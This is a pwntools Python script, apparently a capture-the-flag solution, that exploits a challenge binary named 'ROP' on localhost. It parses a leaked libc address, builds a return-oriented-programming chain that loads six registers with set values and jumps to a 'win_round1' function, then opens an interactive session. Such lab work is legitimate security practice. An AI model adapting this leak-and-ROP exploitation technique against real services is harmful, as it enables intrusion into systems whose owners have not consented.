#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ROP
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'rop/deploy/ROP')
# libc = ELF("/lib/libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# io = start()
io = remote('localhost', 37373)
# a                   b         c         d        e         f           h
# 0x19e24dbf4f16b6, 0x1337, , 0x4d1d0001, 0x4269,    -1,         -1, 0xdeadbeefbadecafe
# rdi                rsi      rdx       rcx         r8        r9        stack
rdi =0x0000000000125a00 # : pop rax ; pop rdi ; call rax
pop_rdi = 0x16e06b
rsi = 0x3dd16
# rdx = 0x0000000000170337 # ret 6
rcx = 0x000000000003d1ee
r8 = 0x00000000001659e6
r9 = 0x401423

rcx1 = 0x9e7fe
rdi1 = 0x10202d
rsi1 = 0xfec6b
# rdx1 =  
# print(hex(exe.symbols["win_round1"]))
leak = io.recvuntil(b"libc.so.6\n").splitlines()[-1].split(b'-')[0]
# leak = io.recvline().split(b'-')[0]
# print()
libc = int(leak, 16)
print(hex(libc))
pl = b'X' * 0x18

pl += p64(libc + pop_rdi) + p64(0x19e24dbf4f16b6)
pl += p64(rsi+libc) + p64(0x1337)
pl += p64(libc+rcx) + p64(0x060505010)
pl += p64(r9) + p64(0xffffffffffffffff)
pl += p64(0x13b649+libc) + p64(0x4d1d0001) + p64(0x0) 
pl += p64(rcx + libc) + p64(0x4269)
pl += p64(r8 + libc) + p64(0xffffffff)



pl += p64(exe.symbols["win_round1"]) 
pl += p64(0x0)
pl += p64(0xdeadbeefbadecafe)



# pause()
io.send(pl)

io.interactive()

